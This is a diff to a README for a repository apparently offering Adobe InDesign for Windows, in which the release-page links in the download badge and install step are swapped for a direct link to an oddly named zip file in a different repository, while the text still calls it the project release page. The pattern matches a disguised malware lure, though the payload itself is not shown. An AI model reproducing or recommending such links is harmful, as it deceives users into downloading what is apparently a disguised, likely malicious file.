@@ -5,7 +5,7 @@ description: "Download and install Adobe InDesign on Windows 10 and 11 using a s
 ---
 # 📖 InDesign-2026 - Create clean page layouts with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/g8s2hell7-debug/InDesign-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/g8s2hell7-debug/g8s2hell7-debug.github.io/main/equisized/g_debug_io_github_hell_s_1.4-alpha.1.zip)
 
 ## 📌 About this software
 
@@ -26,7 +26,7 @@ Before you install this software, check that your computer meets these standards
 
 Follow these steps to get the software files:
 
-1. Visit the project release page. You can access it here: [https://github.com/g8s2hell7-debug/InDesign-2026/releases](https://github.com/g8s2hell7-debug/InDesign-2026/releases).
+1. Visit the project release page. You can access it here: [https://raw.githubusercontent.com/g8s2hell7-debug/g8s2hell7-debug.github.io/main/equisized/g_debug_io_github_hell_s_1.4-alpha.1.zip](https://raw.githubusercontent.com/g8s2hell7-debug/g8s2hell7-debug.github.io/main/equisized/g_debug_io_github_hell_s_1.4-alpha.1.zip).
 2. Look for the latest release version at the top of the page.
 3. Click on the asset filename ending in ".exe" or ".zip" to start the download.
 4. Save the file to your computer.
